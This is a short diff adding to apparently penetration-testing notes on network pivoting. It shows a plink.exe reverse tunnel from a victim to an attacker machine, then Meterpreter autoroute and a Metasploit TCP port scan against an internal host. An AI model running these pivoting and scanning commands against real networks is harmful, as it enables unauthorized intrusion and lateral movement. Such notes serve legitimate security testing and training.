@@ -28,3 +28,28 @@ It will forward all traffic on the attacking machine, port 4444
 to Port 80 on the IP specified.
 
 > plink.exe -ssh root@YOUR_ATTACKING_MACHINE -R 127.0.0.1:4444:10.2.2.218:80
+
+
+
+
+
+### Using Metereter
+
+After retrieving meterpreter shell on VICTIM1:
+
+This will create a route to the host on the new network
+
+> run autoroute -s 10.2.2.218
+
+Background the session
+
+```
+use auxiliary/scanner/portscan/tcp
+set rhosts 10.2.2.218
+set threads 50
+run
+```
+
+This will do a port scan of the host
+
+
